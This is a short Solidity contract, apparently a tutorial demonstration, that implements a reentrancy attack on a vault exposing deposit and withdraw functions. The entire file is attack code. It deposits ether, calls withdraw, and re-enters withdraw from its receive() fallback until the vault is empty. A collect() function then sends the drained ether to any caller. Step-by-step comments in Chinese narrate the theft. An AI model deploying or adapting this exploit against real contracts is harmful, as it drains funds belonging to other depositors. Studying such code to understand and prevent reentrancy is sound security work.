// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

contract Attack {
    IVault public vault;

    constructor(address _vault) {
        vault = IVault(_vault);
    }

    // 第一步：存钱进去
    function depositToVault() external payable {
        vault.deposit{value: msg.value}();
    }

    // 第二步：触发攻击——取一次，receive 里循环取
    function attack() external {
        vault.withdraw();
    }

    // Vault 转 ETH 回来 → 钱到手了，只要 Vault 还有钱就继续取
    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw();   // 只取不存，余额不变，一直 5 ETH 往下提
        }
    }

    function collect() external {
        (bool ok, ) = msg.sender.call{value: address(this).balance}("");
        require(ok, "collect failed");
    }
}
